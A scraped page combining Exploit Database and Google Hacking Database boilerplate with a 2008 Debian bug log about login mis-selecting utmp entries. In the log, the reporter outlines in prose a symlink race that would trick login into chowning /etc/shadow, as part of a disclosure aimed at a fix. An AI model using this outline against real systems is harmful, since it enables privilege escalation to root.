compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from securityreason.com_247a120e_20250125_151805.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from bugs.debian.org_e7e633ab_20250125_151755.html ===

# Debian Bug report logs - #505071 login tty mis-determination (see bug#332198)

[![version graph](version.cgi?collapse=1;absolute=0;fixed=1%3A4.1.4.1-1;height=2;package=login;width=2;found=shadow%2F1%3A4.0.18.1-7)](version.cgi?fixed=1%3A4.1.4.1-1;absolute=0;collapse=1;package=login;found=shadow%2F1%3A4.0.18.1-7;info=1)

Package:
[login](pkgreport.cgi?package=login);
Maintainer for [login](pkgreport.cgi?package=login) is [util-linux packagers <util-linux@packages.debian.org>](pkgreport.cgi?maint=util-linux%40packages.debian.org); Source for [login](pkgreport.cgi?package=login) is [src:util-linux](pkgreport.cgi?src=util-linux) ([PTS](https://tracker.debian.org/pkg/util-linux), [buildd](https://buildd.debian.org/util-linux), [popcon](https://qa.debian.org/popcon.php?package=util-linux)).

Reported by: [Paul Szabo <psz@maths.usyd.edu.au>](pkgreport.cgi?submitter=psz%40maths.usyd.edu.au)

Date: Sun, 9 Nov 2008 07:33:01 UTC

Severity: normal

Found in version shadow/1:4.0.18.1-7

Fixed in version 1:4.1.4.1-1

**Done:** Nicolas François <nicolas.francois@centraliens.net>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=505071;mbox=yes), [status mbox](bugreport.cgi?bug=505071;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=505071;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 09 Nov 2008 07:33:03 GMT) ([full text](bugreport.cgi?bug=505071;msg=2), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

New Bug report received and forwarded. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 09 Nov 2008 07:33:04 GMT) ([full text](bugreport.cgi?bug=505071;msg=4), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=5), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: login tty mis-determination (see bug#332198)
Date: Sun, 09 Nov 2008 18:26:39 +1100
```
Package: login
Version: 1:4.0.18.1-7
Severity: normal

(I wanted to send this to  332198@bugs.debian.org  but that was not
accepted, surely because that is closed/archived.)

I found in my logs (I think first occurrence of such mis-behaviour):

Nov  8 05:50:09 rome in.telnetd[21060]: connect from psz@bari.maths.usyd.edu.au (129.78.69.145)
Nov  8 05:50:12 rome login[21062]: (pam_unix) session opened for user root by (uid=0)
Nov  8 05:50:12 rome login[21062]: can't stat(`/dev/smb/39'): errno 2
Nov  8 05:50:12 rome login[21062]: unable to determine TTY name, got /dev/smb/39

Surely that Samba device is wrong for a telnet session...

Hope this helps in tacking down the cause of this bug.

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

-- System Information:
Debian Release: 4.0
  APT prefers stable
  APT policy: (500, 'stable')
Architecture: i386 (i686)
Shell:  /bin/sh linked to /bin/bash
Kernel: Linux 2.6.24-pk03.02-svr
Locale: LANG=C, LC_CTYPE=C (charmap=ANSI_X3.4-1968)

Versions of packages login depends on:
ii  libc6                  2.3.6.ds1-13etch7 GNU C Library: Shared libraries
ii  libpam-modules         0.79-5            Pluggable Authentication Modules f
ii  libpam-runtime         0.79-5            Runtime support for the PAM librar
ii  libpam0g               0.79-5            Pluggable Authentication Modules l

login recommends no packages.

-- no debconf information

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 09 Nov 2008 12:09:15 GMT) ([full text](bugreport.cgi?bug=505071;msg=7), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=7), [link](#6)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 09 Nov 2008 12:09:16 GMT) ([full text](bugreport.cgi?bug=505071;msg=9), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=9), [link](#8)).

---

[Message #10](#10) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=10), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=10), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Paul Szabo <psz@maths.usyd.edu.au>, 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: login tty mis-determination
(see bug#332198)
Date: Sun, 9 Nov 2008 13:06:30 +0100
```
Hello,

First of all, this issue was already discussed, and the main problem was
that we were not able to reproduce it.
Are you currently able to reproduce it?

That would help us a lot, since this would allow testing instrumentation
of login to find the root cause.

Would you agree testing some patches?

On Sun, Nov 09, 2008 at 06:26:39PM +1100, psz@maths.usyd.edu.au wrote:
> Package: login
> Version: 1:4.0.18.1-7
> Severity: normal
>
> (I wanted to send this to  332198@bugs.debian.org  but that was not
> accepted, surely because that is closed/archived.)
>
> I found in my logs (I think first occurrence of such mis-behaviour):
>
> Nov  8 05:50:09 rome in.telnetd[21060]: connect from psz@bari.maths.usyd.edu.au (129.78.69.145)
> Nov  8 05:50:12 rome login[21062]: (pam_unix) session opened for user root by (uid=0)
> Nov  8 05:50:12 rome login[21062]: can't stat(`/dev/smb/39'): errno 2
> Nov  8 05:50:12 rome login[21062]: unable to determine TTY name, got /dev/smb/39
>
> Surely that Samba device is wrong for a telnet session...

You logged in with telnet, right?

Do you know the version of telnet you are using?
Do you know if telnet creates a utmp entry before calling login?

What might be happening is that telnet do not create a utmp entry, and an
old one from samba is reused (in checkutmp). This should be very rare also
because the bug would occur only if the same pid is reused.

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 09 Nov 2008 21:54:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=12), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=12), [link](#11)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 09 Nov 2008 21:54:04 GMT) ([full text](bugreport.cgi?bug=505071;msg=14), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=14), [link](#13)).

---

[Message #15](#15) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=15), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=15), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 10 Nov 2008 08:51:53 +1100
```
Dear Nicolas (Nekral?),

> First of all, this issue was already discussed, and the main problem was
> that we were not able to reproduce it.

Yes, I am aware of bug #332198.

> Are you currently able to reproduce it?

Have not yet attempted to actively reproduce, have observed one
occurrence of "spontaneous" bad behaviour.

> That would help us a lot, since this would allow testing instrumentation
> of login to find the root cause.
> Would you agree testing some patches?

Yes, would be happy to test.

>> I found in my logs (I think first occurrence of such mis-behaviour):
>>
>> Nov  8 05:50:09 rome in.telnetd[21060]: connect from psz@bari.maths.usyd.edu.au (129.78.69.145)
>> Nov  8 05:50:12 rome login[21062]: (pam_unix) session opened for user root by (uid=0)
>> Nov  8 05:50:12 rome login[21062]: can't stat(`/dev/smb/39'): errno 2
>> Nov  8 05:50:12 rome login[21062]: unable to determine TTY name, got /dev/smb/39
>>
>> Surely that Samba device is wrong for a telnet session...
>
> You logged in with telnet, right?
> Do you know the version of telnet you are using?
> Do you know if telnet creates a utmp entry before calling login?

Yes, with telnet; version 0.17-34 (debian etch); surely it cannot
possibly create utmp (telnet runs on bari, telnetd on rome).

> What might be happening is that telnet do not create a utmp entry, and an
> old one from samba is reused (in checkutmp). This should be very rare also
> because the bug would occur only if the same pid is reused.

Yes, I agree that this is a re-use of an old "unclosed" utmp entry.
(Samba is in the habit of leaving such unclosed entries.) My logs show
(much earlier than the above-quoted lines):

Nov  7 00:52:02 rome samba[21062]: Connect IPC_ for smbguest from p706f (p706f.pc.maths.usyd.edu.au, 129.78.223.215)

and I did not notice other utmp uses for the same PID in between.

---

Seems to me that the picking of utent in checkutmp by PID (and type?)
only is naive, should pick by line (or id) also, in fact pick by the
is_my_tty checks.

---

File src/login.c has line 87
  extern struct utmp utent;
whereas file libmisc/utmp.c has line 48
  struct utmp utent;
without extern: is that correct?

---

Other comments. Am worried that relying on utmp correctness is a
security risk: conceptually because group utmp would become
root-equivalent, and practically because of shenanigans with utmp
writing e.g. bugs #329156 #330907.

In file libmisc/chowntty.c :
- line 51: should the call
    (stat (tty, &by_name))
  be changed to lstat? Avoid being fooled by symlinks.
- line 66: is the check
    (by_name.st_rdev != by_fd.st_rdev)
  sufficient: can it be fooled with symlinks or hardlinks?
- lines 122,123: should chown(tty,...) and chmod(tty,...) be changed to
  fchown(0,...) and fchmod(0,...)? Avoid being fooled by symlinks and
  races.

Seems to me that as things stand, writing a suitable utmp entry, would
trick login into chowning an arbitrary file. Should I attempt to write
an exploit/demo?

---

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 09 Nov 2008 23:24:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=17), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=17), [link](#16)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 09 Nov 2008 23:24:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=19), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=19), [link](#18)).

---

[Message #20](#20) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=20), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=20), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Paul Szabo <psz@maths.usyd.edu.au>, 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty
mis-determination (see bug#332198)
Date: Mon, 10 Nov 2008 00:20:56 +0100
```
Hi,

Thanks for your answer.
The culprit is now confirmed.

On Mon, Nov 10, 2008 at 08:51:53AM +1100, psz@maths.usyd.edu.au wrote:
> Dear Nicolas (Nekral?),
>
> > First of all, this issue was already discussed, and the main problem was
> > that we were not able to reproduce it.
>
> Yes, I am aware of bug #332198.
>
> > Are you currently able to reproduce it?
>
> Have not yet attempted to actively reproduce, have observed one
> occurrence of "spontaneous" bad behaviour.
>
> > That would help us a lot, since this would allow testing instrumentation
> > of login to find the root cause.
> > Would you agree testing some patches?
>
> Yes, would be happy to test.
>
> >> I found in my logs (I think first occurrence of such mis-behaviour):
> >>
> >> Nov  8 05:50:09 rome in.telnetd[21060]: connect from psz@bari.maths.usyd.edu.au (129.78.69.145)
> >> Nov  8 05:50:12 rome login[21062]: (pam_unix) session opened for user root by (uid=0)
> >> Nov  8 05:50:12 rome login[21062]: can't stat(`/dev/smb/39'): errno 2
> >> Nov  8 05:50:12 rome login[21062]: unable to determine TTY name, got /dev/smb/39
> >>
> >> Surely that Samba device is wrong for a telnet session...
> >
> > You logged in with telnet, right?
> > Do you know the version of telnet you are using?
> > Do you know if telnet creates a utmp entry before calling login?
>
> Yes, with telnet; version 0.17-34 (debian etch); surely it cannot
> possibly create utmp (telnet runs on bari, telnetd on rome).

Well, I meant telnetd should have inserted a utmp entry, on teh server
side.

> > What might be happening is that telnet do not create a utmp entry, and an
> > old one from samba is reused (in checkutmp). This should be very rare also
> > because the bug would occur only if the same pid is reused.
>
> Yes, I agree that this is a re-use of an old "unclosed" utmp entry.
> (Samba is in the habit of leaving such unclosed entries.) My logs show
> (much earlier than the above-quoted lines):
>
> Nov  7 00:52:02 rome samba[21062]: Connect IPC_ for smbguest from p706f (p706f.pc.maths.usyd.edu.au, 129.78.223.215)
>
> and I did not notice other utmp uses for the same PID in between.
>
> ---
>
> Seems to me that the picking of utent in checkutmp by PID (and type?)
> only is naive, should pick by line (or id) also, in fact pick by the
> is_my_tty checks.

I agree with you that the utmp handling in shadow is not clean, and might
have a security implication.

I fear I won't have time to work on it in the next 2/3 weeks.

I think checking for the line might be good if the line is known, as well
as the user if possible.

> File src/login.c has line 87
>   extern struct utmp utent;
> whereas file libmisc/utmp.c has line 48
>   struct utmp utent;
> without extern: is that correct?

I think that's the expected behavior, however, I would prefer to avoid
such hidden communication between the modules.

> ---
>
> Other comments. Am worried that relying on utmp correctness is a
> security risk: conceptually because group utmp would become
> root-equivalent, and practically because of shenanigans with utmp
> writing e.g. bugs #329156 #330907.
>
> In file libmisc/chowntty.c :
> - line 51: should the call
>     (stat (tty, &by_name))
>   be changed to lstat? Avoid being fooled by symlinks.
> - line 66: is the check
>     (by_name.st_rdev != by_fd.st_rdev)
>   sufficient: can it be fooled with symlinks or hardlinks?
> - lines 122,123: should chown(tty,...) and chmod(tty,...) be changed to
>   fchown(0,...) and fchmod(0,...)? Avoid being fooled by symlinks and
>   races.
>
> Seems to me that as things stand, writing a suitable utmp entry, would
> trick login into chowning an arbitrary file. Should I attempt to write
> an exploit/demo?

That would be nice to check if it would be possible to chown /etc/shadow
by cheating utmp.

A fake demo would be nice.
(by "fake demo", I mean that you do not have to find a way to guess the
PID, but can recompile a new login which use an hardcoded utmp entry in
checkutmp; that would be sufficient since we already know the utmp entry
selection is wrong and can be cheated)

I hope is_my_tty protects it, but I did not checked at all the complete
path.

Cheers,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 00:06:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=22), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=22), [link](#21)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 00:06:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=24), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=24), [link](#23)).

---

[Message #25](#25) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=25), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=25), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 10 Nov 2008 11:04:12 +1100
```
Dear Nekral,

>> Seems to me that as things stand, writing a suitable utmp entry, would
>> trick login into chowning an arbitrary file. Should I attempt to write
>> an exploit/demo?
>
> That would be nice to check if it would be possible to chown /etc/shadow
> by cheating utmp.
>
> A fake demo would be nice.
> (by "fake demo", I mean that you do not have to find a way to guess the
> PID, but can recompile a new login which use an hardcoded utmp entry in
> checkutmp; that would be sufficient since we already know the utmp entry
> selection is wrong and can be cheated)
>
> I hope is_my_tty protects it, but I did not checked at all the complete
> path.

I expect the following would work:
Predict what PID and tty will be used by login. (This is rather simple:
surely the next available ones, maybe current tty.) For sake of example,
say these are PID=123 and tty=/dev/pts/1.
Pre-create a symlink  /tmp/x -> /dev/pts/1  and write an utmp entry
with PID=123, line=/tmp/x, type=LOGIN_PROCESS.
Run login. While login is running, change /tmp/x to point to /etc/shadow.
We win the race if the change is done after stat(tty,...) within
is_my_tty and before chown(tty,...) in chown_tty.

Hope this is sufficient...

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 10:24:04 GMT) ([full text](bugreport.cgi?bug=505071;msg=27), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=27), [link](#26)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 10:24:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=29), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=29), [link](#28)).

---

[Message #30](#30) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=30), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=30), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 10 Nov 2008 21:15:58 +1100
```
Dear Nekral,

I have not yet written an exploit/PoC/demo, but think it should be
rather easy to do. Looking at the recent DSA-1500 also, I ask you to
change the severity of this bug to "critical - root security hole",
and of course to fix things quickly. (I would change the severity
myself, but I think as a result of bug #299007 am not allowed.)

Thanks, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 11:39:13 GMT) ([full text](bugreport.cgi?bug=505071;msg=32), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=32), [link](#31)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 11:39:13 GMT) ([full text](bugreport.cgi?bug=505071;msg=34), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=34), [link](#33)).

---

[Message #35](#35) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=35), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=35), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty
mis-determination (see bug#332198)
Date: Mon, 10 Nov 2008 12:17:01 +0100
```
Hello,

I think there are two different bugs:

 * one is that login relies on the utmp entry with the current PID
   In my opinion, this cannot be exploited because is_my_tty will detect
   it.

 * The other one is that between is_my_tty and chown, there is a race
   condition.
   Changing chown (tty, ...) to fchown (0, ...) might work and might be
   sufficient.

The first bug is not critical.

The second one should be fixed for Lenny, but tested first.

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 23:21:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=37), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=37), [link](#36)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 23:21:11 GMT) ([full text](bugreport.cgi?bug=505071;msg=39), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=39), [link](#38)).

---

[Message #40](#40) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=40), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=40), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty mis-determination (see bug#332198)
Date: Tue, 11 Nov 2008 07:36:18 +1100
```
Dear Nekral,

Curious way of counting bugs. What do you mean exploitable: to do what?
(Surely is_my_tty cannot protect, being buggy itself.)

As I see things, the following bugs are present:

- bad selection of utmp entry [often choosing wrong]
- is_my_tty uses stat [should be lstat]
- is_my_tty compares rdev only [should also test dev ino etc]
- maybe is_my_tty should scrutinize path [ensure directory components
  are root-owned and safe]
- race between is_my_tty checks and chown
- chown of unsafe path [should be fchown anyway]

As things are, it is exploitable to elevate privileges from group utmp
to root. It is also buggy, often failing for legitimate use. Fixing all
bugs would be best; fixing some may already render it "safe" against
exploitation, and/or restore functionality.

Please, fix soon. Please change severity.

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 23:27:13 GMT) ([full text](bugreport.cgi?bug=505071;msg=42), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=42), [link](#41)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 23:27:13 GMT) ([full text](bugreport.cgi?bug=505071;msg=44), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=44), [link](#43)).

---

[Message #45](#45) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=45), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=45), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty mis-determination (see bug#332198)
Date: Tue, 11 Nov 2008 07:39:50 +1100
```
Dear Nekral,

Sorry, I missed your comment:

> ... should be fixed for Lenny ...

No. Should be fixed now, for etch. Needs a DSA.

